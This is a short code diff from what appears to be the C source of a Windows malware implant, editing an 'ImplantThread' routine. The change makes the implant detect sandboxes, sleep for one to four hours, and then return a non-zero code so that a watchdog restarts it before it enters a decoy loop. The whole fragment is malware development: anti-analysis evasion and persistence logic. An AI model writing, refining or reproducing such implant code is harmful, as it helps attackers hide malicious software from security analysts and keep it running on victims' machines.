@@ -50,13 +50,12 @@ DWORD WINAPI ImplantThread(LPVOID) {
     printf("[DEBUG] ImplantThread started\n");
     fflush(stdout);
 
-    // ─── Sandbox detection → deep sleep ────────────────────────────────────
+    // ─── Sandbox detection → deep sleep then restart via watchdog ─────────
     if (SandboxCheck()) {
         printf("[DEBUG] Sandbox detected – entering deep sleep (1–4 hours).\n");
         fflush(stdout);
-        // DeepSleep is called inside ReapplyEvasion, but we do it here explicitly
         DeepSleep();
-        return 0; // after deep sleep, exit (watchdog will restart)
+        return 1; // non-zero → watchdog restarts; returning 0 terminates the process
     }
 
     DecoyLoop();
